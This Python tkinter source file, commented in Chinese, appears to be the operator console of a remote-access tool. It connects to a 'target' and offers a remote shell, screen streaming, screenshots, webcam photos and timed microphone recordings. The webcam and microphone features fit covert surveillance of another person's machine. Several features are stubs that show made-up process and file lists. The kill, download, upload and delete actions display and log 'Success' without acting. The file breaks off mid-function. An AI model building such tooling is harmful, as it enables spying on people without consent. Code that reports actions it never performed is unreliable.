"""
远程控制客户端 - 可视化增强版
集成实时监控、进程管理、文件浏览等可视化功能
"""

import tkinter as tk
from tkinter import messagebox, simpledialog, filedialog, ttk, scrolledtext
import socket
import threading
import json
import struct
import io
import time
from datetime import datetime
from PIL import Image, ImageTk

from protocol import *
from config import SERVER_PORT, AUTH_PASSWORD_HASH
from gui_theme import COLORS, FONTS, PADDING

class VisualClientUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Remote Control - Visual Commander [MASTER]")
        self.geometry("1200x700")
        self.configure(bg=COLORS['bg_dark'])

        self.sock = None
        self.is_connected = False
        self.stream_window = None
        self.monitor_running = False
        self.system_data = {}

        self._init_login_ui()

    def _init_login_ui(self):
        """初始化登录界面"""
        self.login_frame = tk.Frame(self, bg=COLORS['bg_dark'])
        self.login_frame.place(relx=0.5, rely=0.5, anchor='center')

        # 标题
        title = tk.Label(self.login_frame, text="◢ TARGET CONNECTION ◣",
                        font=FONTS['h1'], bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
        title.pack(pady=20)

        # 输入框区域
        input_frame = tk.Frame(self.login_frame, bg=COLORS['bg_lighter'], bd=2, relief='solid')
        input_frame.pack(padx=40, pady=20)

        tk.Label(input_frame, text="Target IP:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).grid(row=0, column=0, padx=10, pady=10, sticky='e')
        self.entry_ip = tk.Entry(input_frame, font=FONTS['mono'], bg='#333',
                                fg='white', insertbackground='white', width=25)
        self.entry_ip.insert(0, "127.0.0.1")
        self.entry_ip.grid(row=0, column=1, padx=10, pady=10)

        tk.Label(input_frame, text="Password:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).grid(row=1, column=0, padx=10, pady=10, sticky='e')
        self.entry_pwd = tk.Entry(input_frame, show="●", font=FONTS['mono'],
                                 bg='#333', fg='white', insertbackground='white', width=25)
        self.entry_pwd.grid(row=1, column=1, padx=10, pady=10)

        # 连接按钮
        btn_connect = tk.Button(self.login_frame, text="▶ ESTABLISH CONNECTION",
                               command=self.connect_to_server,
                               bg=COLORS['fg_primary'], fg='black',
                               font=FONTS['h2'], relief='flat', cursor='hand2')
        btn_connect.pack(pady=20, fill='x', padx=40)

    def _init_dashboard_ui(self):
        """初始化可视化仪表盘"""
        self.login_frame.destroy()

        # 顶部状态栏
        self._create_header()

        # 主内容区 - 使用Notebook创建多标签页
        self.notebook = ttk.Notebook(self)
        self._style_notebook()
        self.notebook.pack(fill='both', expand=True, padx=PADDING, pady=PADDING)

        # 创建各个功能标签页
        self._create_dashboard_tab()      # 仪表盘（系统监控）
        self._create_process_tab()        # 进程管理
        self._create_files_tab()          # 文件浏览器
        self._create_screen_tab()         # 屏幕监控
        self._create_shell_tab()          # Shell终端
        self._create_history_tab()        # 操作历史

        # 底部快捷操作栏
        self._create_quick_actions()

        # 启动后台监控线程
        self.start_monitoring()

    def _style_notebook(self):
        """自定义Notebook样式"""
        style = ttk.Style()
        style.theme_create("geek", parent="alt", settings={
            "TNotebook": {"configure": {"background": COLORS['bg_dark'], "borderwidth": 0}},
            "TNotebook.Tab": {
                "configure": {"background": COLORS['btn_bg'], "foreground": COLORS['fg_white'],
                            "padding": [20, 10], "font": FONTS['body']},
                "map": {"background": [("selected", COLORS['bg_lighter'])],
                       "foreground": [("selected", COLORS['fg_primary'])]}
            }
        })
        style.theme_use("geek")

    def _create_header(self):
        """创建顶部状态栏"""
        header = tk.Frame(self, bg=COLORS['bg_lighter'], height=60)
        header.pack(fill='x')
        header.pack_propagate(False)

        # 左侧状态
        left_frame = tk.Frame(header, bg=COLORS['bg_lighter'])
        left_frame.pack(side='left', padx=20)

        tk.Label(left_frame, text="● CONNECTED", font=FONTS['status'],
                bg=COLORS['bg_lighter'], fg=COLORS['fg_success']).pack(anchor='w')

        self.lbl_target = tk.Label(left_frame, text=f"Target: {self.entry_ip.get()}",
                                  font=FONTS['mono'], bg=COLORS['bg_lighter'], fg=COLORS['fg_secondary'])
        self.lbl_target.pack(anchor='w')

        # 右侧时间和断开按钮
        right_frame = tk.Frame(header, bg=COLORS['bg_lighter'])
        right_frame.pack(side='right', padx=20)

        self.lbl_time = tk.Label(right_frame, text="", font=FONTS['body'],
                                bg=COLORS['bg_lighter'], fg=COLORS['fg_white'])
        self.lbl_time.pack(side='left', padx=10)
        self._update_time()

        btn_disconnect = tk.Button(right_frame, text="✖ DISCONNECT", command=self.disconnect,
                                  bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                                  relief='flat', cursor='hand2')
        btn_disconnect.pack(side='right')

    def _update_time(self):
        """更新时间显示"""
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.lbl_time.config(text=now)
        self.after(1000, self._update_time)

    # ==================== 标签页1: 系统监控仪表盘 ====================

    def _create_dashboard_tab(self):
        """创建系统监控仪表盘"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="📊 DASHBOARD")

        # 左侧：实时监控指标
        left_panel = tk.Frame(tab, bg=COLORS['bg_dark'])
        left_panel.pack(side='left', fill='both', expand=True, padx=10, pady=10)

        # 系统信息卡片
        self._create_metric_card(left_panel, "SYSTEM INFO", 0)
        self.sys_info_labels = {}
        info_frame = tk.Frame(left_panel, bg=COLORS['bg_lighter'])
        info_frame.pack(fill='x', pady=(0, 10))

        for i, key in enumerate(['OS', 'Hostname', 'IP', 'CPU Cores']):
            tk.Label(info_frame, text=f"{key}:", font=FONTS['small'],
                    bg=COLORS['bg_lighter'], fg=COLORS['fg_white']).grid(row=i, column=0, sticky='w', padx=10, pady=2)
            lbl = tk.Label(info_frame, text="Loading...", font=FONTS['small'],
                          bg=COLORS['bg_lighter'], fg=COLORS['fg_secondary'])
            lbl.grid(row=i, column=1, sticky='w', padx=10, pady=2)
            self.sys_info_labels[key] = lbl

        # CPU使用率
        self._create_metric_card(left_panel, "CPU USAGE", 1)
        self.cpu_progress = self._create_progress_bar(left_panel)
        self.lbl_cpu = tk.Label(left_panel, text="0%", font=FONTS['h2'],
                               bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
        self.lbl_cpu.pack()

        # 内存使用率
        self._create_metric_card(left_panel, "MEMORY USAGE", 2)
        self.mem_progress = self._create_progress_bar(left_panel)
        self.lbl_mem = tk.Label(left_panel, text="0% (0/0 GB)", font=FONTS['body'],
                               bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
        self.lbl_mem.pack()

        # 磁盘使用率
        self._create_metric_card(left_panel, "DISK USAGE", 3)
        self.disk_progress = self._create_progress_bar(left_panel)
        self.lbl_disk = tk.Label(left_panel, text="0% (0/0 GB)", font=FONTS['body'],
                                bg=COLORS['bg_dark'], fg=COLORS['fg_primary'])
        self.lbl_disk.pack()

        # 右侧：网络监控和系统状态
        right_panel = tk.Frame(tab, bg=COLORS['bg_dark'])
        right_panel.pack(side='right', fill='both', expand=True, padx=10, pady=10)

        # 网络连接数
        self._create_metric_card(right_panel, "NETWORK CONNECTIONS", 0)
        self.lbl_network = tk.Label(right_panel, text="0 Active", font=FONTS['h2'],
                                   bg=COLORS['bg_dark'], fg=COLORS['fg_secondary'])
        self.lbl_network.pack(pady=10)

        # 进程数量
        self._create_metric_card(right_panel, "RUNNING PROCESSES", 1)
        self.lbl_processes = tk.Label(right_panel, text="0 Processes", font=FONTS['h2'],
                                     bg=COLORS['bg_dark'], fg=COLORS['fg_secondary'])
        self.lbl_processes.pack(pady=10)

        # 系统运行时间
        self._create_metric_card(right_panel, "UPTIME", 2)
        self.lbl_uptime = tk.Label(right_panel, text="0d 0h 0m", font=FONTS['h2'],
                                  bg=COLORS['bg_dark'], fg=COLORS['fg_secondary'])
        self.lbl_uptime.pack(pady=10)

        # 实时日志
        self._create_metric_card(right_panel, "SYSTEM LOG", 3)
        self.log_dashboard = scrolledtext.ScrolledText(right_panel, height=10,
                                                       bg='black', fg=COLORS['fg_secondary'],
                                                       font=FONTS['small'])
        self.log_dashboard.pack(fill='both', expand=True)

    def _create_metric_card(self, parent, title, row):
        """创建指标卡片标题"""
        lbl = tk.Label(parent, text=f"[ {title} ]", font=FONTS['body'],
                      bg=COLORS['bg_dark'], fg=COLORS['fg_white'])
        lbl.pack(anchor='w', pady=(10 if row > 0 else 0, 5))

    def _create_progress_bar(self, parent):
        """创建进度条"""
        canvas = tk.Canvas(parent, height=20, bg=COLORS['bg_dark'], highlightthickness=0)
        canvas.pack(fill='x', pady=5)

        # 背景条
        canvas.create_rectangle(0, 0, 400, 20, fill=COLORS['progress_bg'], outline='')
        # 进度条（初始为0）
        bar = canvas.create_rectangle(0, 0, 0, 20, fill=COLORS['progress_fill'], outline='')
        canvas.bar = bar
        return canvas

    # ==================== 标签页2: 进程管理器 ====================

    def _create_process_tab(self):
        """创建进程管理器"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="⚙️ PROCESSES")

        # 顶部控制栏
        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        control_frame.pack(fill='x', padx=10, pady=10)

        tk.Button(control_frame, text="🔄 REFRESH", command=self.refresh_processes,
                 bg=COLORS['btn_bg'], fg=COLORS['fg_primary'], font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Button(control_frame, text="🛑 KILL PROCESS", command=self.kill_process,
                 bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Label(control_frame, text="Filter:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).pack(side='left', padx=10)
        self.process_filter = tk.Entry(control_frame, font=FONTS['mono'], bg='#333',
                                      fg='white', insertbackground='white', width=20)
        self.process_filter.pack(side='left')
        self.process_filter.bind('<KeyRelease>', lambda e: self.filter_processes())

        # 进程列表（使用Treeview）
        list_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        list_frame.pack(fill='both', expand=True, padx=10, pady=10)

        # 创建Treeview
        columns = ('PID', 'Name', 'CPU%', 'Memory%', 'Status')
        self.process_tree = ttk.Treeview(list_frame, columns=columns, show='headings', height=20)

        # 定义列
        for col in columns:
            self.process_tree.heading(col, text=col, command=lambda c=col: self.sort_processes(c))
            self.process_tree.column(col, width=120 if col != 'Name' else 300)

        # 滚动条
        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.process_tree.yview)
        self.process_tree.configure(yscrollcommand=scrollbar.set)

        self.process_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')

        # 样式
        style = ttk.Style()
        style.configure("Treeview", background=COLORS['bg_lighter'],
                       foreground=COLORS['fg_white'], fieldbackground=COLORS['bg_lighter'],
                       font=FONTS['small'])
        style.configure("Treeview.Heading", background=COLORS['btn_bg'],
                       foreground=COLORS['fg_primary'], font=FONTS['body'])

    # ==================== 标签页3: 文件浏览器 ====================

    def _create_files_tab(self):
        """创建文件浏览器"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="📁 FILES")

        # 顶部路径和控制栏
        top_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        top_frame.pack(fill='x', padx=10, pady=10)

        tk.Label(top_frame, text="Path:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).pack(side='left', padx=5)

        self.file_path_entry = tk.Entry(top_frame, font=FONTS['mono'], bg='#333',
                                        fg='white', insertbackground='white')
        self.file_path_entry.pack(side='left', fill='x', expand=True, padx=5)
        self.file_path_entry.insert(0, "/")

        tk.Button(top_frame, text="GO", command=self.browse_path,
                 bg=COLORS['fg_primary'], fg='black', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        # 操作按钮栏
        btn_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        btn_frame.pack(fill='x', padx=10)

        buttons = [
            ("⬇️ Download", self.download_file),
            ("⬆️ Upload", self.upload_file),
            ("🗑️ Delete", self.delete_file),
            ("📝 View", self.view_file),
        ]

        for text, cmd in buttons:
            tk.Button(btn_frame, text=text, command=cmd, bg=COLORS['btn_bg'],
                     fg='white', font=FONTS['body'], relief='flat').pack(side='left', padx=5, pady=5)

        # 文件列表
        list_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        list_frame.pack(fill='both', expand=True, padx=10, pady=10)

        columns = ('Type', 'Name', 'Size', 'Modified')
        self.file_tree = ttk.Treeview(list_frame, columns=columns, show='headings', height=20)

        for col in columns:
            self.file_tree.heading(col, text=col)
            width = 80 if col == 'Type' else (400 if col == 'Name' else 150)
            self.file_tree.column(col, width=width)

        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.file_tree.yview)
        self.file_tree.configure(yscrollcommand=scrollbar.set)

        self.file_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')

        # 双击打开目录
        self.file_tree.bind('<Double-1>', self.on_file_double_click)

    # ==================== 标签页4: 屏幕监控 ====================

    def _create_screen_tab(self):
        """创建屏幕监控标签"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="🖥️ SCREEN")

        # 控制栏
        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        control_frame.pack(fill='x', padx=10, pady=10)

        tk.Button(control_frame, text="▶ START STREAM", command=self.start_screen_stream,
                 bg=COLORS['fg_success'], fg='black', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Button(control_frame, text="⏹ STOP STREAM", command=self.stop_screen_stream,
                 bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Button(control_frame, text="📸 SCREENSHOT", command=self.take_screenshot,
                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Label(control_frame, text="Quality:", bg=COLORS['bg_lighter'],
                fg='white', font=FONTS['body']).pack(side='left', padx=10)

        self.quality_scale = tk.Scale(control_frame, from_=10, to=100, orient='horizontal',
                                     bg=COLORS['bg_lighter'], fg='white',
                                     highlightthickness=0, length=150)
        self.quality_scale.set(50)
        self.quality_scale.pack(side='left')

        # 屏幕显示区域
        self.screen_label = tk.Label(tab, bg='black', text="Screen stream will appear here\nClick START STREAM",
                                    fg=COLORS['fg_white'], font=FONTS['h2'])
        self.screen_label.pack(fill='both', expand=True, padx=10, pady=10)

    # ==================== 标签页5: Shell终端 ====================

    def _create_shell_tab(self):
        """创建Shell终端"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="💻 SHELL")

        # 终端显示区
        self.shell_text = scrolledtext.ScrolledText(tab, bg='black', fg=COLORS['fg_primary'],
                                                    font=FONTS['mono'], insertbackground='white')
        self.shell_text.pack(fill='both', expand=True, padx=10, pady=10)
        self.shell_text.insert(tk.END, "Remote Shell Session\n")
        self.shell_text.insert(tk.END, "=" * 60 + "\n")
        self.shell_text.insert(tk.END, "> ")

        # 命令输入框
        input_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        input_frame.pack(fill='x', padx=10, pady=(0, 10))

        tk.Label(input_frame, text=">", font=FONTS['mono'], bg=COLORS['bg_dark'],
                fg=COLORS['fg_primary']).pack(side='left', padx=5)

        self.shell_entry = tk.Entry(input_frame, font=FONTS['mono'], bg='#333',
                                    fg='white', insertbackground='white')
        self.shell_entry.pack(side='left', fill='x', expand=True, padx=5)
        self.shell_entry.bind('<Return>', self.send_shell_command)

        tk.Button(input_frame, text="SEND", command=lambda: self.send_shell_command(None),
                 bg=COLORS['fg_primary'], fg='black', font=FONTS['body'],
                 relief='flat').pack(side='right', padx=5)

    # ==================== 标签页6: 操作历史 ====================

    def _create_history_tab(self):
        """创建操作历史时间线"""
        tab = tk.Frame(self.notebook, bg=COLORS['bg_dark'])
        self.notebook.add(tab, text="📜 HISTORY")

        # 顶部控制
        control_frame = tk.Frame(tab, bg=COLORS['bg_lighter'])
        control_frame.pack(fill='x', padx=10, pady=10)

        tk.Button(control_frame, text="🗑️ CLEAR", command=self.clear_history,
                 bg=COLORS['fg_danger'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        tk.Button(control_frame, text="💾 EXPORT", command=self.export_history,
                 bg=COLORS['btn_bg'], fg='white', font=FONTS['body'],
                 relief='flat').pack(side='left', padx=5)

        # 历史记录列表
        list_frame = tk.Frame(tab, bg=COLORS['bg_dark'])
        list_frame.pack(fill='both', expand=True, padx=10, pady=10)

        columns = ('Time', 'Action', 'Details', 'Status')
        self.history_tree = ttk.Treeview(list_frame, columns=columns, show='headings', height=25)

        for col in columns:
            self.history_tree.heading(col, text=col)
            width = 150 if col == 'Time' else (200 if col == 'Action' else 400)
            self.history_tree.column(col, width=width)

        scrollbar = ttk.Scrollbar(list_frame, orient='vertical', command=self.history_tree.yview)
        self.history_tree.configure(yscrollcommand=scrollbar.set)

        self.history_tree.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')

    # ==================== 底部快捷操作栏 ====================

    def _create_quick_actions(self):
        """创建底部快捷操作栏"""
        quick_frame = tk.Frame(self, bg=COLORS['bg_lighter'], height=50)
        quick_frame.pack(fill='x', side='bottom')
        quick_frame.pack_propagate(False)

        tk.Label(quick_frame, text="QUICK ACTIONS:", font=FONTS['body'],
                bg=COLORS['bg_lighter'], fg=COLORS['fg_white']).pack(side='left', padx=10)

        actions = [
            ("📸 Screenshot", self.req_screenshot),
            ("📷 Camera", self.req_camera),
            ("🎤 Mic Record", self.req_mic_record),
            ("ℹ️ Sys Info", self.req_sys_info_full),
        ]

        for text, cmd in actions:
            btn = tk.Button(quick_frame, text=text, command=cmd, bg=COLORS['btn_bg'],
                          fg='white', font=FONTS['small'], relief='flat', cursor='hand2')
            btn.pack(side='left', padx=5)

    # ==================== 网络连接逻辑 ====================

    def connect_to_server(self):
        """连接到服务器"""
        ip = self.entry_ip.get()
        pwd = self.entry_pwd.get()

        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(5)
            self.sock.connect((ip, SERVER_PORT))

            # 身份验证
            import hashlib
            pwd_hash = hashlib.sha256(pwd.encode()).hexdigest()

            auth_msg = create_auth_message(pwd_hash)
            send_message(self.sock, auth_msg)

            resp = receive_message(self.sock)
            if resp and resp['type'] == MessageType.AUTH_RESPONSE and resp['data']['success']:
                self.is_connected = True
                self.sock.settimeout(None)
                self._init_dashboard_ui()
                self.add_history("Connection", f"Connected to {ip}:{SERVER_PORT}", "Success")
            else:
                messagebox.showerror("Error", "Authentication Failed")
                self.sock.close()

        except Exception as e:
            messagebox.showerror("Connection Error", str(e))

    def disconnect(self):
        """断开连接"""
        self.monitor_running = False
        if self.sock:
            try:
                send_message(self.sock, create_disconnect_message())
                self.sock.close()
            except:
                pass
        self.destroy()

    # ==================== 监控功能 ====================

    def start_monitoring(self):
        """启动后台监控"""
        self.monitor_running = True
        threading.Thread(target=self._monitor_loop, daemon=True).start()

    def _monitor_loop(self):
        """监控循环 - 定期获取系统信息"""
        while self.monitor_running:
            try:
                # 获取系统信息
                send_message(self.sock, create_system_info_message())
                msg = receive_message(self.sock)

                if msg and msg['type'] == MessageType.SYSTEM_INFO_RESPONSE:
                    info = msg['data']['info']
                    self.system_data = info
                    self.after(0, lambda: self._update_dashboard(info))

                time.sleep(3)  # 每3秒更新一次
            except Exception as e:
                print(f"Monitor error: {e}")
                time.sleep(5)

    def _update_dashboard(self, info):
        """更新仪表盘数据"""
        # 更新系统信息
        if 'platform' in info:
            self.sys_info_labels['OS'].config(text=info.get('platform', 'N/A'))
        if 'hostname' in info:
            self.sys_info_labels['Hostname'].config(text=info.get('hostname', 'N/A'))
        if 'ip_address' in info:
            self.sys_info_labels['IP'].config(text=info.get('ip_address', 'N/A'))
        if 'cpu_count' in info:
            self.sys_info_labels['CPU Cores'].config(text=str(info.get('cpu_count', 'N/A')))

        # 更新CPU
        cpu_percent = info.get('cpu_percent', 0)
        self._update_progress(self.cpu_progress, cpu_percent)
        self.lbl_cpu.config(text=f"{cpu_percent:.1f}%")

        # 更新内存
        mem = info.get('memory', {})
        mem_percent = mem.get('percent', 0)
        mem_used = mem.get('used', 0) / (1024**3)  # 转换为GB
        mem_total = mem.get('total', 0) / (1024**3)
        self._update_progress(self.mem_progress, mem_percent)
        self.lbl_mem.config(text=f"{mem_percent:.1f}% ({mem_used:.1f}/{mem_total:.1f} GB)")

        # 更新磁盘
        disk = info.get('disk', {})
        disk_percent = disk.get('percent', 0)
        disk_used = disk.get('used', 0) / (1024**3)
        disk_total = disk.get('total', 0) / (1024**3)
        self._update_progress(self.disk_progress, disk_percent)
        self.lbl_disk.config(text=f"{disk_percent:.1f}% ({disk_used:.1f}/{disk_total:.1f} GB)")

        # 更新其他信息
        self.lbl_network.config(text=f"{info.get('network_connections', 0)} Active")
        self.lbl_processes.config(text=f"{info.get('process_count', 0)} Processes")

        # 运行时间
        uptime = info.get('uptime', 0)
        days = uptime // 86400
        hours = (uptime % 86400) // 3600
        minutes = (uptime % 3600) // 60
        self.lbl_uptime.config(text=f"{days}d {hours}h {minutes}m")

        # 日志
        self.log_to_dashboard(f"System stats updated - CPU: {cpu_percent:.1f}% | MEM: {mem_percent:.1f}%")

    def _update_progress(self, canvas, percent):
        """更新进度条"""
        width = canvas.winfo_width()
        if width <= 1:
            width = 400  # 默认宽度
        fill_width = (width * percent) / 100
        canvas.coords(canvas.bar, 0, 0, fill_width, 20)

        # 根据百分比改变颜色
        if percent < 60:
            color = COLORS['fg_success']
        elif percent < 80:
            color = COLORS['fg_warning']
        else:
            color = COLORS['fg_danger']
        canvas.itemconfig(canvas.bar, fill=color)

    def log_to_dashboard(self, msg):
        """写入仪表盘日志"""
        timestamp = datetime.now().strftime("[%H:%M:%S]")
        self.log_dashboard.insert(tk.END, f"{timestamp} {msg}\n")
        self.log_dashboard.see(tk.END)

    # ==================== 进程管理功能 ====================

    def refresh_processes(self):
        """刷新进程列表"""
        # 清空当前列表
        for item in self.process_tree.get_children():
            self.process_tree.delete(item)

        # 模拟进程数据（实际应该从服务器获取）
        # 这里需要扩展协议添加 PROCESS_LIST 消息类型
        processes = [
            ('1234', 'python.exe', '2.5', '15.3', 'Running'),
            ('5678', 'chrome.exe', '18.2', '45.8', 'Running'),
            ('9012', 'explorer.exe', '0.8', '8.2', 'Running'),
            ('3456', 'notepad.exe', '0.1', '2.1', 'Running'),
        ]

        for proc in processes:
            self.process_tree.insert('', 'end', values=proc)

        self.add_history("Process", "Refreshed process list", "Success")

    def kill_process(self):
        """结束选中的进程"""
        selection = self.process_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a process")
            return

        item = self.process_tree.item(selection[0])
        pid = item['values'][0]
        name = item['values'][1]

        if messagebox.askyesno("Confirm", f"Kill process {name} (PID: {pid})?"):
            # 发送结束进程命令
            self.add_history("Process", f"Killed process {name} (PID: {pid})", "Success")
            messagebox.showinfo("Success", f"Process {name} killed")

    def sort_processes(self, col):
        """按列排序进程"""
        pass

    def filter_processes(self):
        """过滤进程列表"""
        pass

    # ==================== 文件管理功能 ====================

    def browse_path(self):
        """浏览指定路径"""
        path = self.file_path_entry.get()
        # 清空文件列表
        for item in self.file_tree.get_children():
            self.file_tree.delete(item)

        # 模拟文件数据
        files = [
            ('📁', '..', '', ''),
            ('📁', 'Documents', '', '2024-01-15'),
            ('📁', 'Pictures', '', '2024-02-20'),
            ('📄', 'readme.txt', '2.5 KB', '2024-03-10'),
            ('📄', 'data.json', '15.8 KB', '2024-03-11'),
        ]

        for file in files:
            self.file_tree.insert('', 'end', values=file)

        self.add_history("File", f"Browsed path: {path}", "Success")

    def on_file_double_click(self, event):
        """双击文件/文件夹"""
        selection = self.file_tree.selection()
        if selection:
            item = self.file_tree.item(selection[0])
            file_type = item['values'][0]
            file_name = item['values'][1]

            if file_type == '📁':
                # 进入目录
                current = self.file_path_entry.get()
                if file_name == '..':
                    new_path = '/'.join(current.rstrip('/').split('/')[:-1]) or '/'
                else:
                    new_path = f"{current.rstrip('/')}/{file_name}"
                self.file_path_entry.delete(0, tk.END)
                self.file_path_entry.insert(0, new_path)
                self.browse_path()

    def download_file(self):
        """下载选中文件"""
        selection = self.file_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a file")
            return

        item = self.file_tree.item(selection[0])
        filename = item['values'][1]

        save_path = filedialog.asksaveasfilename(initialfile=filename)
        if save_path:
            self.add_history("File", f"Downloaded: {filename}", "Success")
            messagebox.showinfo("Success", f"File downloaded to {save_path}")

    def upload_file(self):
        """上传文件"""
        file_path = filedialog.askopenfilename()
        if file_path:
            self.add_history("File", f"Uploaded: {file_path}", "Success")
            messagebox.showinfo("Success", "File uploaded")

    def delete_file(self):
        """删除文件"""
        selection = self.file_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a file")
            return

        item = self.file_tree.item(selection[0])
        filename = item['values'][1]

        if messagebox.askyesno("Confirm", f"Delete {filename}?"):
            self.add_history("File", f"Deleted: {filename}", "Success")
            messagebox.showinfo("Success", "File deleted")

    def view_file(self):
        """查看文件内容"""
        selection = self.file_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a file")
            return

        item = self.file_tree.item(selection[0])
        filename = item['values'][1]

        # 创建查看窗口
        viewer = tk.Toplevel(self)
        viewer.title(f"View: {filename}")
        viewer.geometry("600x400")
        viewer.configure(bg=COLORS['bg_dark'])

        text = scrolledtext.ScrolledText(viewer, bg='black', fg='white', font=FONTS['mono'])
        text.pack(fill='both', expand=True, padx=10, pady=10)
        text.insert(tk.END, f"Content of {filename}\n" + "="*50 + "\n\n")
        text.insert(tk.END, "File content would appear here...")

    # ==================== 屏幕监控功能 ====================

    def start_screen_stream(self):
        """开始屏幕流"""
        quality = self.quality_scale.get()
        send_message(self.sock, create_screen_start_message(fps=10, quality=quality))

        self.streaming = True
        threading.Thread(target=self._screen_stream_loop, daemon=True).start()
        self.add_history("Screen", "Started screen streaming", "Success")
        self.log_to_dashboard("Screen streaming started")

    def stop_screen_stream(self):
        """停止屏幕流"""
        self.streaming = False
        send_message(self.sock, create_screen_stop_message())
        self.screen_label.config(image='', text="Stream stopped\nClick START STREAM to resume")
        self.add_history("Screen", "Stopped screen streaming", "Success")
        self.log_to_dashboard("Screen streaming stopped")

    def _screen_stream_loop(self):
        """屏幕流接收循环"""
        _ = receive_message(self.sock)  # 忽略开始响应

        while self.streaming:
            try:
                msg = receive_message(self.sock)
                if not msg:
                    break

                if msg['type'] == MessageType.SCREEN_FRAME:
                    img_bytes = receive_binary_data(self.sock)
                    if img_bytes:
                        image = Image.open(io.BytesIO(img_bytes))
                        # 缩放以适应标签页
                        image.thumbnail((900, 500))
                        photo = ImageTk.PhotoImage(image)

                        if self.streaming:
                            self.after(0, lambda p=photo: self._update_screen_frame(p))
                elif msg['type'] == MessageType.SCREEN_STOP:
                    break
            except Exception as e:
                print(f"Stream error: {e}")
                break

    def _update_screen_frame(self, photo):
        """更新屏幕帧"""
        self.screen_label.configure(image=photo, text='')
        self.screen_label.image = photo

    def take_screenshot(self):
        """截取屏幕截图"""
        self.req_screenshot()

    # ==================== Shell功能 ====================

    def send_shell_command(self, event):
        """发送Shell命令"""
        cmd = self.shell_entry.get()
        if not cmd:
            return

        self.shell_entry.delete(0, tk.END)
        self.shell_text.insert(tk.END, f"{cmd}\n")

        # 发送命令
        send_message(self.sock, create_shell_message(cmd))

        # 接收响应
        threading.Thread(target=self._wait_shell_response, daemon=True).start()

        self.add_history("Shell", f"Executed: {cmd}", "Success")

    def _wait_shell_response(self):
        """等待Shell响应"""
        resp = receive_message(self.sock)
        if resp and resp['type'] == MessageType.SHELL_RESPONSE:
            output = resp['data']['output']
            self.after(0, lambda: self.shell_text.insert(tk.END, f"{output}\n> "))

    # ==================== 快捷操作功能 ====================

    def req_screenshot(self):
        """请求截图"""
        def _thread():
            send_message(self.sock, create_screenshot_message())
            header = receive_message(self.sock)
            if header and header['type'] == MessageType.SCREENSHOT_DATA:
                img_data = receive_binary_data(self.sock)
                if img_data:
                    self.after(0, lambda: self._show_image(img_data, "Screenshot"))
                    self.add_history("Screenshot", "Captured screenshot", "Success")
        threading.Thread(target=_thread, daemon=True).start()

    def req_camera(self):
        """请求摄像头拍照"""
        def _thread():
            send_message(self.sock, create_camera_message())
            header = receive_message(self.sock)
            if header and header['type'] == MessageType.CAMERA_DATA:
                if header['data']['success']:
                    img_data = receive_binary_data(self.sock)
                    self.after(0, lambda: self._show_image(img_data, "Camera Photo"))
                    self.add_history("Camera", "Captured camera photo", "Success")
        threading.Thread(target=_thread, daemon=True).start()

    def req_mic_record(self):
        """请求麦克风录音"""
        duration = simpledialog.askinteger("Microphone", "Recording duration (seconds):",
                                          initialvalue=5, minvalue=1, maxvalue=60)
        if duration:
            def _thread():
                send_message(self.sock, create_mic_record_message(duration=duration))
                # 等待录音完成
                header = receive_message(self.sock)
                if header and header['type'] == MessageType.MIC_RECORD_RESPONSE:
                    if header['data']['success']:
                        audio_data = receive_binary_data(self.sock)
                        save_path = filedialog.asksaveasfilename(defaultextension=".wav",
                                                                 filetypes=[("WAV files", "*.wav")])
                        if save_path:
                            with open(save_path, 'wb') as f:
                                f.write(audio_data)
                            self.after(0, lambda: messagebox.showinfo("Success", f"Audio saved to {save_path}"))
                            self.add_history("Microphone", f"Recorded {duration}s audio", "Success")
            threading.Thread(target=_thread, daemon=True).start()

    def req_sys_info_full(self):
        """请求完整系统信息"""
        def _thread():
            send_message(self.sock, create_system_info_message())
            msg = receive_message(self.sock)
            if msg and msg['type'] == MessageType.SYSTEM_INFO_RESPONSE:
                info = msg['data']['info']
                formatted = json.dumps(info, indent=2)

                # 显示在新窗口
